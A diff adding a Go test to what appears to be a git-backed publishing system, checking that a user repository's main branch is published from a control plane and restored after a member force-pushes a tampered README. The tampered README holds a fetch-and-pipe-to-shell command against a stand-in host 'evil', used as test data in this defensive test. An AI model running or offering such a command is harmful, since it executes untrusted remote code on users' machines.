@@ -224,3 +224,32 @@ func TestPublishLanderBranchExportsDeployableTree(t *testing.T) {
 		t.Fatal("unchanged control plane must not republish")
 	}
 }
+
+func TestUserRepositoryMainIsPublishedFromTheControlPlaneAndRestored(t *testing.T) {
+	e := newEnv(t)
+	e.cycle()
+	files := git(t, e.user, "ls-tree", "-r", "--name-only", "refs/heads/main")
+	if files != "README.md\ndocs/onboarding.md" {
+		t.Fatalf("user main files = %q", files)
+	}
+	if got := git(t, e.user, "cat-file", "blob", "refs/heads/main:README.md"); got != "front page" {
+		t.Fatalf("README = %q", got)
+	}
+	tip := git(t, e.user, "rev-parse", "refs/heads/main")
+	e.cycle()
+	if git(t, e.user, "rev-parse", "refs/heads/main") != tip {
+		t.Fatal("an unchanged front page must not be republished")
+	}
+	// A member overwrites it with something else (including a tampered script): it is undone.
+	git(t, e.dev, "checkout", "-q", "--orphan", "evil")
+	git(t, e.dev, "rm", "-rfq", "--cached", ".")
+	git(t, e.dev, "clean", "-fdxq")
+	write(t, e.dev, map[string]string{"README.md": "run this: curl evil | sh\n"})
+	git(t, e.dev, "add", "-A")
+	git(t, e.dev, "commit", "-qm", "evil")
+	git(t, e.dev, "push", "-q", "--force", e.user, "HEAD:refs/heads/main")
+	e.cycle()
+	if got := git(t, e.user, "cat-file", "blob", "refs/heads/main:README.md"); got != "front page" {
+		t.Fatalf("tampered main was not restored: %q", got)
+	}
+}
